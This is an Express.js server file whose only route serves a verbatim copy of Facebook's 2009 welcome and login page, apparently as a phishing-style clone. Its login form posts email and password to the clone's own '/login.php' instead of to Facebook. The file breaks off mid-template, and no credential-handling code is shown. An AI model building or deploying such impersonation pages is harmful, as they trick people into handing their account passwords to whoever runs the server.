var express = require('express');
var app = express();
var path = require('path');

//your routes here
app.get('/', function (req, res) {
    res.send(`<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
   "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" id="facebook">
<head>
<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
<meta http-equiv="Content-language" content="en" />
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
<script type="text/javascript">
//<![CDATA[
(function(href) { var uri_re = /^(?:(?:[^:\/?#]+):)?(?:\/\/(?:[^\/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?/; href.replace(uri_re, function(all, path, query, frag) { if (frag) { var dst, src = path + (query ? '?' + query : ''); if (frag.charAt(0) == '/') { dst = frag.replace(/^\/+/, '/'); } else if (/&|=/.test(frag)) { var q = {}; var m = frag.match(/([^#]*)(#.*)?/); var arr = (query||'').split('&').concat((m[1]||'').split('&')); for (var i=0, length=arr.length; i<length; i++) { var t = arr[i].split('='); if (t.length && t[0] != '') { q[t[0]] = t[1]; } } var s = []; for (var i in q) { s.push(i+ (q[i]?'='+q[i]:'')); } dst = path+'?'+s.join('&')+(m[2]||''); } if (dst && dst != src) { window.location.replace(dst); } } }); })(window.location.href); var onloadRegister = window.onloadRegister || function(h) { onloadhooks.push(h); }; var onloadhooks = window.onloadhooks || []; var onafterloadRegister = window.onafterloadRegister || function(h) { onafterloadhooks.push(h); }; var onafterloadhooks = window.onafterloadhooks || []; function wait_for_load(element, e, f) { f = bind(element, f, e); if (window.loaded) { return f(); } switch ((e || event).type) { case 'load': case 'focus': onloadRegister(f); return; case 'click': if (element.original_cursor === undefined) { element.original_cursor = element.style.cursor; } if (document.body.original_cursor === undefined) { document.body.original_cursor = document.body.style.cursor; } element.style.cursor = document.body.style.cursor = 'progress'; onafterloadRegister(function() { element.style.cursor = element.original_cursor; document.body.style.cursor = document.body.original_cursor; element.original_cursor = document.body.original_cursor = undefined; if (element.tagName.toLowerCase() == 'a') { var original_event = window.event; window.event = e; var ret_value = element.onclick.call(element, e); window.event = original_event; if (ret_value !== false && element.href) { window.location.href = element.href; } } else if (element.click) { element.click(); } }); break; } return false; }; function bind(obj, method ) { var args = []; for (var ii = 2; ii < arguments.length; ii++) { args.push(arguments[ii]); } var fn = function() { var _obj = obj || (this == window ? false : this); var _args = args.slice(); for (var jj = 0; jj < arguments.length; jj++) { _args.push(arguments[jj]); } if (typeof(method) == "string") { if (_obj[method]) { return _obj[method].apply(_obj, _args); } } else { return method.apply(_obj, _args); } }; if (typeof method == 'string') { fn.name = method; } else if (method && method.name) { fn.name = method.name; } fn.toString = function() { return bind._toString(obj, args, method); }; return fn; }; var curry = bind(null, bind, null); bind._toString = bind._toString || function(obj, args, method) { return (typeof method == 'string') ? ('late bind<'+method+'>') : ('bound<'+method.toString()+'>'); }; function goURI(uri, force_reload) { uri = uri.toString(); if (!force_reload && window.PageTransitions && PageTransitions.isInitialized()) { PageTransitions.go(uri); } else if (window.location.href == uri) { window.location.reload(); } else { window.location.href = uri; } } var PrimordialBootloader = window.PrimordialBootloader || { loaded : [], done : function(names) { PrimordialBootloader.loaded.push(names); } }; var Bootloader = window.Bootloader || { done : PrimordialBootloader.done }; function loadExternalJavascript(urls, callback, body) { if (urls instanceof Array) { var url = urls.shift(0); loadExternalJavascript(url, function() { if (urls.length) { loadExternalJavascript(urls, callback, body); } else { callback && callback(); } }, body); } else { var node = body ? document.body : document.getElementsByTagName('head')[0]; var script = document.createElement('script'); script.type = 'text/javascript'; script.src = urls; if (callback) { script.onerror = script.onload = callback; script.onreadystatechange = function() { if (this.readyState == "complete" || this.readyState == "loaded") { callback(); } } } node.appendChild(script); return script; } } window.loadFirebugConsole && window.loadFirebugConsole();document.cookie = "cavalry_transit_start_time=; expires=Mon, 26 Jul 1997 05:00:00 GMT; path=\/; domain=.facebook.com";
//]]>
</script>
<meta name="robots" content="noodp,noydir" />
<meta name="description" content="Facebook is a social utility that connects people with friends and others who work, study and live around them. People use Facebook to keep up with friends, upload an unlimited number of photos, post links and videos, and learn more about the people they meet." />
<title>Welcome to Facebook! | Facebook</title>

<script type="text/javascript">
Env={method:"GET",dev:0,start:(new Date()).getTime(),ps_limit:5,ps_ratio:4,svn_rev:151460,static_base:"http:\/\/static.ak.fbcdn.net\/",tlds:["com","dk","no","se"],ajax_bundle:1};
</script>
  <script type="text/javascript" src="http://b.static.ak.fbcdn.net/js_strings.php/t85905/en_US"></script>

    <script type="text/javascript" src="http://b.static.ak.fbcdn.net/rsrc.php/z24Y8/lpkg/c44nixir/en_US/141/150747/js/78fgdhc8cfks4g8k.pkg.js"></script>
<script type="text/javascript">Bootloader.loadInitialResources([{"name":"js\/recaptcha_ajax.js","type":"js","src":"http:\/\/b.static.ak.fbcdn.net\/rsrc.php\/z50HP\/l\/evx16nue\/en_US\/144677\/js\/recaptcha_ajax.js","permanent":false},{"name":"js\/a9pz9yc6jtsksccc.pkg.js","type":"js","src":"http:\/\/b.static.ak.fbcdn.net\/rsrc.php\/z5QQT\/lpkg\/6v2rcsrh\/en_US\/141\/150744\/js\/a9pz9yc6jtsksccc.pkg.js","permanent":false},{"name":"js\/useragent.js","type":"js","src":"http:\/\/b.static.ak.fbcdn.net\/rsrc.php\/zEJTV\/l\/5k5jekhg\/nu_ll\/139152\/js\/useragent.js","permanent":false},{"name":"js\/1xekq7p2x7vo04go.pkg.js","type":"js","src":"http:\/\/b.static.ak.fbcdn.net\/rsrc.php\/zADYA\/lpkg\/28gj8myo\/en_US\/141\/151327\/js\/1xekq7p2x7vo04go.pkg.js","permanent":false}])</script>

    <link type="text/css" rel="stylesheet" href="http://static.ak.fbcdn.net/rsrc.php/z22AE/lpkg/15n8dg14/en_US/141/150535/css/8miun4q7u6cko4os.pkg.css" />
    <link type="text/css" rel="stylesheet" href="http://b.static.ak.fbcdn.net/rsrc.php/z8KQQ/lpkg/eewiqqu8/en_US/141/147549/css/3is3ingrub6skcc0.pkg.css" />
    <link type="text/css" rel="stylesheet" href="http://static.ak.fbcdn.net/rsrc.php/zIMCQ/lpkg/etf148hu/en_US/141/150744/css/1sltnw27smf4sogc.pkg.css" />
    <link type="text/css" rel="stylesheet" href="http://b.static.ak.fbcdn.net/rsrc.php/zHW7H/l/b5pdlfqn/en_US/150249/css/UIErrorFlag.css" />
    <link type="text/css" rel="stylesheet" href="http://b.static.ak.fbcdn.net/rsrc.php/z49GM/lpkg/d0snom8o/en_US/141/150683/css/1uom3yh8tp7o4so4.pkg.css" />

    <link type="text/css" rel="stylesheet" href="http://b.static.ak.fbcdn.net/rsrc.php/zB9WX/lpkg/18v0035x/en_US/141/149707/css/8s1o7zf4to0sgok0.pkg.css" />
<!--[if lte IE 6]><link rel="stylesheet" href="http://b.static.ak.fbcdn.net/rsrc.php/z9GWI/l/12ohbnkz/en_US/142532/css/ie6.css" type="text/css"/><![endif]-->
<!--[if IE 7]><link rel="stylesheet" href="http://b.static.ak.fbcdn.net/rsrc.php/zBT4M/l/a8h3fb3n/en_US/136369/css/ie7.css" type="text/css"/><![endif]-->

<link rel="search" type="application/opensearchdescription+xml" href="http://b.static.ak.fbcdn.net/opensearch_desc.xml?8:72379" title="Facebook" />
<link rel="shortcut icon" href="http://static.ak.fbcdn.net/favicon.ico?8:132011" />
</head>
<body class="WelcomePage ff3 UIPage_LoggedOut Locale_en_US">
<div id="dropmenu_container"></div><div id="nonfooter"><div id="page_height" class="clearfix"><div id="menubar_container"><div id="fb_menubar" class="fb_menubar_logged_out clearfix"><div id="fb_menubar_core"><ul class="fb_menu_list"><li class="fb_menu" id="fb_menubar_logo"><a href="http://www.facebook.com" title="Go to Facebook Home"><span>&nbsp;</span></a></li></ul></div><div id="fb_menubar_aux"><ul class="fb_menu_list"><div class="menu_login_container"><form method="POST" action="/login.php" name="menubar_login" id="menubar_login"><input type="hidden" name="charset_test" value="&euro;,&acute;,�,�,?,?,?" /><input type="hidden" id="locale" name="locale" value="en_US" /><table cellpadding="0" cellspacing="0"><tr><td class="login_form_label_field login_form_label_remember"><label><input type="checkbox" name="persistent" value="1" />Remember Me</label></td><td class="login_form_label_field"><a href="http://www.facebook.com/reset.php" rel="nofollow">Forgot your password?</a></td><td class="login_form_last_field login_form_label_field"></td></tr><tr><td><input type="text" class="inputtext" id="email" name="email" value="" /></td><td><input type="password" class="inputpassword" id="pass" name="pass" value="" /><input type="text" class="inputtext hidden_elem" id="pass_placeholder" name="pass_placeholder" value="" /></td><td class="login_form_last_field"><div class="inner"><div class="UILinkButton "><input type="submit" class="UILinkButton_A" value="Login" /><div class="UILinkButton_RW"><div class="UILinkButton_R"></div></div></div></div></td></tr></table><input type="hidden" name="charset_test" value="&euro;,&acute;,�,�,?,?,?" /></form>
</div></ul></div></div></div><div id="content" class="fb_content"><div class="UIOneOff_Container"><!-- 2365fa3194ecdc0cab15721ce967a9f8663937c7 -->
<div class="WelcomePage_Container"><div class="WelcomePage_MainSellContainer"><div class="WelcomePage_MainSell"><div class="WelcomePage_MainSellCenter clearfix"><div class="WelcomePage_MainSellLeft"><div class="WelcomePage_MainMessage">Facebook helps you connect and share with the people in your life.</div><div class="WelcomePage_MainMap">&nbsp;</div></div><div class="WelcomePage_MainSellRight"><div class="WelcomePage_SignUpSection"><div class="WelcomePage_SignUpMessage"><div class="WelcomePage_SignUpHeadline">Sign Up</div><div class="WelcomePage_SignUpSubheadline">It's free and anyone can join</div></div><div class="WelcomePage_SimpleReg" id="registration_container"><div class="simple_registration_container"><div id="reg_box"><form method="post" action="https://register.facebook.com/r.php" name="reg" id="reg" onsubmit="return wait_for_load(this, event, function() { return false; });"><input type="hidden" name="charset_test" value="&euro;,&acute;,�,�,?,?,?" /><input type="hidden" id="locale" name="locale" value="en_US" /><input type="hidden" id="reg_instance" name="reg_instance" value="1237043191-e7c87e2671e249873373314c61d88ccab40aeff1f5f2383610f22" /><noscript><div id="no_js_box"><h2>Javascript is disabled on your browser.</h2><p>Please enable JavaScript on your browser or upgrade to a Javascript-capable browser to register for Facebook.</p></div></noscript><div id="reg_form_box"><table class="editor" border="0" cellspacing="0"><input type="hidden" id="simple_reg" name="simple_reg" value="1" /><tr><td class="label">Full Name:</td><td><div class="field_container"><input type="text" class="inputtext" id="name" name="name" value="" /></div></td></tr>

<tr><td class="label">Your Email:</td><td><div class="field_container"><input type="text" class="inputtext" id="reg_email__" name="reg_email__" value="" /></div></td></tr>
<tr><td class="label">New Password:</td><td><div class="field_container"><input type="password" class="inputpassword" id="reg_passwd__" name="reg_passwd__" value="" /></div></td></tr>
<tr><td class="label">I am:</td><td><div class="field_container"><select class="select" name="sex" id="sex"  ><option value="0">Select Sex:</option><option value="1">Female</option><option value="2">Male</option></select></div></td></tr>
<tr><td class="label">Birthday:</td><td><div class="field_container"> <select name="birthday_month" id="birthday_month" onchange="return wait_for_load(this, event, function() { editor_date_month_change(this, 'birthday_day','birthday_year'); });" autocomplete="off"><option value="-1">Month:</option><option value="1">Jan</option>
<option value="2">Feb</option>
<option value="3">Mar</option>

<option value="4">Apr</option>
<option value="5">May</option>
<option value="6">Jun</option>
<option value="7">Jul</option>
<option value="8">Aug</option>
<option value="9">Sep</option>
<option value="10">Oct</option>
<option value="11">Nov</option>
<option value="12">Dec</option>

</select> <select name="birthday_day" id="birthday_day"  autocomplete="off"><option value="-1">Day:</option><option value="1">1</option>
<option value="2">2</option>
<option value="3">3</option>
<option value="4">4</option>
<option value="5">5</option>
<option value="6">6</option>
<option value="7">7</option>
<option value="8">8</option>

<option value="9">9</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
<option value="13">13</option>
<option value="14">14</option>
<option value="15">15</option>
<option value="16">16</option>
<option value="17">17</option>

<option value="18">18</option>
<option value="19">19</option>
<option value="20">20</option>
<option value="21">21</option>
<option value="22">22</option>
<option value="23">23</option>
<option value="24">24</option>
<option value="25">25</option>
<option value="26">26</option>

<option value="27">27</option>
<option value="28">28</option>
<option value="29">29</option>
<option value="30">30</option>
<option value="31">31</option>
</select> <select name="birthday_year" id="birthday_year" onchange="return wait_for_load(this, event, function() { editor_date_month_change(&quot;birthday_month&quot;,&quot;birthday_day&quot;,this); });" autocomplete="off"><option value="-1">Year:</option><option value="2009">2009</option>
<option value="2008">2008</option>
<option value="2007">2007</option>

<option value="2006">2006</option>
<option value="2005">2005</option>
<option value="2004">2004</option>
<option value="2003">2003</option>
<option value="2002">2002</option>
<option value="2001">2001</option>
<option value="2000">2000</option>
<option value="1999">1999</option>
<option value="1998">1998</option>

<option value="1997">1997</option>
<option value="1996">1996</option>
<option value="1995">1995</option>
<option value="1994">1994</option>
<option value="1993">1993</option>
<option value="1992">1992</option>
<option value="1991">1991</option>
<option value="1990">1990</option>
<option value="1989">1989</option>

<option value="1988">1988</option>
<option value="1987">1987</option>
<option value="1986">1986</option>
<option value="1985">1985</option>
<option value="1984">1984</option>
<option value="1983">1983</option>
<option value="1982">1982</option>
<option value="1981">1981</option>
<option value="1980">1980</option>

<option value="1979">1979</option>
<option value="1978">1978</option>
<option value="1977">1977</option>
<option value="1976">1976</option>
<option value="1975">1975</option>
<option value="1974">1974</option>
<option value="1973">1973</option>
<option value="1972">1972</option>
<option value="1971">1971</option>

<option value="1970">1970</option>
<option value="1969">1969</option>
<option value="1968">1968</option>
<option value="1967">1967</option>
<option value="1966">1966</option>
<option value="1965">1965</option>
<option value="1964">1964</option>
<option value="1963">1963</option>
<option value="1962">1962</option>

<option value="1961">1961</option>
<option value="1960">1960</option>
<option value="1959">1959</option>
<option value="1958">1958</option>
<option value="1957">1957</option>
<option value="1956">1956</option>
<option value="1955">1955</option>
<option value="1954">1954</option>
<option value="1953">1953</option>

<option value="1952">1952</option>
<option value="1951">1951</option>
<option value="1950">1950</option>
<option value="1949">1949</option>
<option value="1948">1948</option>
<option value="1947">1947</option>
<option value="1946">1946</option>
<option value="1945">1945</option>
<option value="1944">1944</option>

<option value="1943">1943</option>
<option value="1942">1942</option>
<option value="1941">1941</option>
<option value="1940">1940</option>
<option value="1939">1939</option>
<option value="1938">1938</option>
<option value="1937">1937</option>
<option value="1936">1936</option>
<option value="1935">1935</option>

<option value="1934">1934</option>
<option value="1933">1933</option>
<option value="1932">1932</option>
<option value="1931">1931</option>
<option value="1930">1930</option>
<option value="1929">1929</option>
<option value="1928">1928</option>
<option value="1927">1927</option>
<option value="1926">1926</option>

<option value="1925">1925</option>
<option value="1924">1924</option>
<option value="1923">1923</option>
<option value="1922">1922</option>
<option value="1921">1921</option>
<option value="1920">1920</option>
<option value="1919">1919</option>
<option value="1918">1918</option>
<option value="1917">1917</option>

<option value="1916">1916</option>
<option value="1915">1915</option>
<option value="1914">1914</option>
<option value="1913">1913</option>
<option value="1912">1912</option>
<option value="1911">1911</option>
<option value="1910">1910</option>
<option value="1909">1909</option>
<option value="1908">1908</option>

<option value="1907">1907</option>
<option value="1906">1906</option>
<option value="1905">1905</option>
<option value="1904">1904</option>
<option value="1903">1903</option>
<option value="1902">1902</option>
<option value="1901">1901</option>
<option value="1900">1900</option>
</select></div></td></tr>

<tr><td class="label"></td><td><div id="birthday_warning"><a onclick="return wait_for_load(this, event, function() { RegUtil.getInstance().show_birthday_help(); return false; });" title="Click for more information">Why do I need to provide this?</a></a></div></td></tr>
<input type="hidden" id="referrer" name="referrer" value="116" /><input type="hidden" id="challenge" name="challenge" value="74b1c7422417c1bfb7b5160a26fcfad2" /><input type="hidden" id="md5pass" name="md5pass" value="" /></table><div class="reg_btn clearfix"><div class="UILinkButton UILinkButton_SU"><input type="submit" class="UILinkButton_A" onclick="return wait_for_load(this, event, function() { RegUtil.getInstance().ajax_validate_data({ignore: [&#039;captcha&#039;]}, &#039;registration_container&#039;, &#039;1&#039; ); return false; });" tabindex="1" value="Sign Up" /><div class="UILinkButton_RW"><div class="UILinkButton_R"></div></div></div></div></div><div id="reg_captcha" style="display: none;"><h2>Security Check</h2><div id="outer_captcha_box"><div id="captcha_box"><div class="field_error" id="captcha_response_error" style="display:none;">This field is required.</div><div id="captcha" class="captcha">
  <input type="hidden" id="captcha_persist_data" name="captcha_persist_data" value="AAAAAQAQuss1fa0NJzLZQ_8d9AthzAAAAGvqENqFy5KkvMip5AIv3QSF7BS7goiHfAC7fTkzr8hW6w6Obqjg4Qu3Uq5huyZBonEd8HfA3ABmk8GPlWGY-DSqS8Yh-ibqyFpcWPmAPnyDvmtAbo5USXWuVjzv_KD1SMyTWhf34AGorQd27dFqZc0a" /><div class="captcha_challenge"><div id="recaptcha_scripts" style="display:none"></div><input type="hidden" id="captcha_session" name="captcha_session" value="hH12U0XhnUEMe8NRh1nkdQ" /><input type="hidden" id="extra_challenge_params" name="extra_challenge_params" value="authp=nonce.tt.time&amp;psig=GlSwoQnaVfWXeIuJ-gawgJF5l2Q&amp;nonce=hH12U0XhnUEMe8NRh1nkdQ&amp;tt=E_UKttrUz5dmxoNcNk2D8M8BmmY&amp;time=1237043191" />
    <div class="recaptcha_text">Enter <strong>both words</strong> below, <strong>separated by a space</strong>.<br />Can't read the words below? <a href="#" id="recaptcha_reload_btn" onclick="return wait_for_load(this, event, function() { Recaptcha.reload(); return false });" tabindex="-1">Try different words</a> or <a href="#" class="recaptcha_only_if_image" onclick="return wait_for_load(this, event, function() { Recaptcha.switch_type(&#039;audio&#039;); return false });" tabindex="-1">an audio captcha</a>.<span id='recaptcha_play_audio'></span><div class="audiocaptcha"><a href="#" class='recaptcha_only_if_audio' onclick="return wait_for_load(this, event, function() { Recaptcha.switch_type('image'); return false });" tabindex='-1'>Back to text.</a></div></div><div id="recaptcha_image">Loading...</div></div><div class="captcha_refresh"></div><div class="captcha_input"><label>Text in the box:</label><div class="field_container"><input type="text" name="captcha_response" id="captcha_response" autocomplete="off" /></div><div style="margin-left: 15px; display: inline;"><a href="#" id="captcha_whatsthis" onclick="return wait_for_load(this, event, function() { captcha_whatsthis(this); return false });">What's This?</a></div>

  </div>
</div></div></div><div id="captcha_buttons" class="clearfix" style="display: none;"><input type="hidden" id="terms" name="terms" value="on" /><p class="legal_tos">By clicking Sign Up, you are indicating that you have read and agree to the <a href="/terms.php" target="_blank" rel="nofollow">Terms of Use</a> and <a href="/policy.php" target="_blank" rel="nofollow">Privacy Policy</a>.</p><div id="back_button" class="gridCol"><div class="cancel_button_image">&nbsp;</div><a href="#" onclick="return wait_for_load(this, event, function() { RegUtil.getInstance().hide_captcha(); RegUtil.getInstance().show_reg_form(); return false; });" id="cancel_button">Back</a></div><div id="A_btn_sign_up" class="gridCol"><div><div class="UILinkButton UILinkButton_SU"><input type="submit" class="UILinkButton_A" onclick="return wait_for_load(this, event, function() { RegUtil.getInstance().ajax_validate_data(&#039;&#039;, &#039;registration_container&#039;, &#039;1&#039;);return false; });" value="Sign Up" /><div class="UILinkButton_RW"><div class="UILinkButton_R"></div></div></div></div></div></div></div></form>
<div id="reg_progress" style="display: none"><div id="progress_wrap"><img src="http://b.static.ak.fbcdn.net/images/loaders/indicator_blue_small.gif?8:111099" alt="" /><div id="progress_msg">Registering&hellip;</div></div></div><div id="reg_error" style="display: none"><div id="reg_error_inner">An error occurred. Please try again.</div></div><div id="reg_pages_msg" >To create a page for a celebrity, band or business, <a href="http://www.facebook.com/pages/create.php">click here</a>.</div></form></div><form id="confirmation_email_form" method="POST" action="/login.php"><input name="ce" id="confirmation_email" type="hidden"></form></div></div></div></div></div></div></div></div></div></div></div></div><div id="pagefooter" class= "pagefooter_minimal"><div class="pagefooter_topborder clearfix"><div class="copyright_and_location clearfix"><div class="copyright" id="pagefooter_copyright"><span title="PHP">Facebook </span><span id="rtime" title="99">&copy;</span> <span title="10.22.121.115">20</span><span title="17304712">09</span></div><div id="locale_footer_selector" class="locale_footer_selector"><div class="dropdown_menu hidden_elem " id="locale_footer_selector_menu"><div class="dropdown_menu_header_shadow"><div class="menu_content"><a href="http://www.facebook.com/" onclick="return wait_for_load(this, event, function() { return false; });">English (US)</a><a href="http://es-la.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;es_LA&quot;, &quot;http:\/\/es-la.facebook.com\/&quot;); return false; });">Espa�ol</a><a href="http://fr-fr.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;fr_FR&quot;, &quot;http:\/\/fr-fr.facebook.com\/&quot;); return false; });">Fran�ais</a><a href="http://de-de.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;de_DE&quot;, &quot;http:\/\/de-de.facebook.com\/&quot;); return false; });">Deutsch</a><a href="http://ja-jp.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;ja_JP&quot;, &quot;http:\/\/ja-jp.facebook.com\/&quot;); return false; });">???</a><a href="http://af-za.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;af_ZA&quot;, &quot;http:\/\/af-za.facebook.com\/&quot;); return false; });">Afrikaans</a><a href="http://ar-ar.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;ar_AR&quot;, &quot;http:\/\/ar-ar.facebook.com\/&quot;); return false; });">???????</a><a href="http://bg-bg.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;bg_BG&quot;, &quot;http:\/\/bg-bg.facebook.com\/&quot;); return false; });">?????????</a><a href="http://ca-es.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;ca_ES&quot;, &quot;http:\/\/ca-es.facebook.com\/&quot;); return false; });">Catal�</a><a href="http://cs-cz.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;cs_CZ&quot;, &quot;http:\/\/cs-cz.facebook.com\/&quot;); return false; });">Ce�tina</a><a href="http://cy-gb.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;cy_GB&quot;, &quot;http:\/\/cy-gb.facebook.com\/&quot;); return false; });">Cymraeg</a><a href="http://www.facebook.dk/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;da_DK&quot;, &quot;http:\/\/www.facebook.dk\/&quot;); return false; });">Dansk</a><a href="http://el-gr.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;el_GR&quot;, &quot;http:\/\/el-gr.facebook.com\/&quot;); return false; });">????????</a><a href="http://en-gb.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;en_GB&quot;, &quot;http:\/\/en-gb.facebook.com\/&quot;); return false; });">English (UK)</a><a href="http://es-es.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;es_ES&quot;, &quot;http:\/\/es-es.facebook.com\/&quot;); return false; });">Espa�ol (Espa�a)</a><a href="http://fi-fi.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;fi_FI&quot;, &quot;http:\/\/fi-fi.facebook.com\/&quot;); return false; });">Suomi</a><a href="http://he-il.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;he_IL&quot;, &quot;http:\/\/he-il.facebook.com\/&quot;); return false; });">?????</a><a href="http://hr-hr.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;hr_HR&quot;, &quot;http:\/\/hr-hr.facebook.com\/&quot;); return false; });">Hrvatski</a><a href="http://hu-hu.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;hu_HU&quot;, &quot;http:\/\/hu-hu.facebook.com\/&quot;); return false; });">Magyar</a><a href="http://id-id.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;id_ID&quot;, &quot;http:\/\/id-id.facebook.com\/&quot;); return false; });">Bahasa Indonesia</a><a href="http://it-it.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;it_IT&quot;, &quot;http:\/\/it-it.facebook.com\/&quot;); return false; });">Italiano</a><a href="http://ko-kr.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;ko_KR&quot;, &quot;http:\/\/ko-kr.facebook.com\/&quot;); return false; });">???</a><a href="http://lt-lt.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;lt_LT&quot;, &quot;http:\/\/lt-lt.facebook.com\/&quot;); return false; });">Lietuviu</a><a href="http://ms-my.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;ms_MY&quot;, &quot;http:\/\/ms-my.facebook.com\/&quot;); return false; });">Bahasa Melayu</a><a href="http://www.facebook.no/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;nb_NO&quot;, &quot;http:\/\/www.facebook.no\/&quot;); return false; });">Norsk (bokm�l)</a><a href="http://nl-nl.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;nl_NL&quot;, &quot;http:\/\/nl-nl.facebook.com\/&quot;); return false; });">Nederlands</a><a href="http://pl-pl.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;pl_PL&quot;, &quot;http:\/\/pl-pl.facebook.com\/&quot;); return false; });">Polski</a><a href="http://pt-br.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;pt_BR&quot;, &quot;http:\/\/pt-br.facebook.com\/&quot;); return false; });">Portugu�s (Brasil)</a><a href="http://pt-pt.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;pt_PT&quot;, &quot;http:\/\/pt-pt.facebook.com\/&quot;); return false; });">Portugu�s (Portugal)</a><a href="http://ro-ro.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;ro_RO&quot;, &quot;http:\/\/ro-ro.facebook.com\/&quot;); return false; });">Rom�na</a><a href="http://ru-ru.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;ru_RU&quot;, &quot;http:\/\/ru-ru.facebook.com\/&quot;); return false; });">???????</a><a href="http://sk-sk.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;sk_SK&quot;, &quot;http:\/\/sk-sk.facebook.com\/&quot;); return false; });">Slovencina</a><a href="http://sl-si.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;sl_SI&quot;, &quot;http:\/\/sl-si.facebook.com\/&quot;); return false; });">Sloven�cina</a><a href="http://sr-rs.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;sr_RS&quot;, &quot;http:\/\/sr-rs.facebook.com\/&quot;); return false; });">??????</a><a href="http://www.facebook.se/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;sv_SE&quot;, &quot;http:\/\/www.facebook.se\/&quot;); return false; });">Svenska</a><a href="http://th-th.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;th_TH&quot;, &quot;http:\/\/th-th.facebook.com\/&quot;); return false; });">???????</a><a href="http://tl-ph.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;tl_PH&quot;, &quot;http:\/\/tl-ph.facebook.com\/&quot;); return false; });">Filipino</a><a href="http://tr-tr.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;tr_TR&quot;, &quot;http:\/\/tr-tr.facebook.com\/&quot;); return false; });">T�rk�e</a><a href="http://vi-vn.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;vi_VN&quot;, &quot;http:\/\/vi-vn.facebook.com\/&quot;); return false; });">Ti?ng Vi?t</a><a href="http://zh-cn.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;zh_CN&quot;, &quot;http:\/\/zh-cn.facebook.com\/&quot;); return false; });">??(??)</a><a href="http://zh-hk.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;zh_HK&quot;, &quot;http:\/\/zh-hk.facebook.com\/&quot;); return false; });">??(??)</a><a href="http://zh-tw.facebook.com/" onclick="return wait_for_load(this, event, function() { intl_set_cookie_locale(&quot;zh_TW&quot;, &quot;http:\/\/zh-tw.facebook.com\/&quot;); return false; });">??(??)</a></div></div></div><div class="dropdown_head  double_arrow"><a href="#" class="dropdown_link" id="locale_footer_selector_hitarea">English (US)&nbsp;<img src="http://static.ak.fbcdn.net/images/spacer.gif?8:11" alt="language selector" style="height:8px;width:5px;" /></a></div></div></div><div id="pagefooter_links"><ul id="pagefooter_left_links"><li><a href="http://www.facebook.com/login.php?ref=pf">Login</a></li><li><a href="http://www.facebook.com/facebook?ref=pf" accesskey="7" rel="nofollow">About</a></li><li><a href="http://www.facebook.com/advertising/?src=pf">Advertising</a></li><li><a href="http://developers.facebook.com/?ref=pf">Developers</a></li><li><a href="http://www.facebook.com/jobs/?ref=pf">Jobs</a></li><li><a href="http://www.facebook.com/terms.php?ref=pf" accesskey="8" rel="nofollow">Terms</a></li></ul><ul id="pagefooter_right_links"><li><a href="http://www.facebook.com/findfriends.php?ref=pf">Find Friends</a></li><li><a href="http://www.facebook.com/policy.php?ref=pf" accesskey="6" rel="nofollow">Privacy</a></li><li><a href="http://www.facebook.com/help.php?ref=pf" accesskey="0" rel="nofollow">Help</a></li></ul></div></div></div><div id="js_buffer"><script type="text/javascript"></script>


<script type="text/javascript">
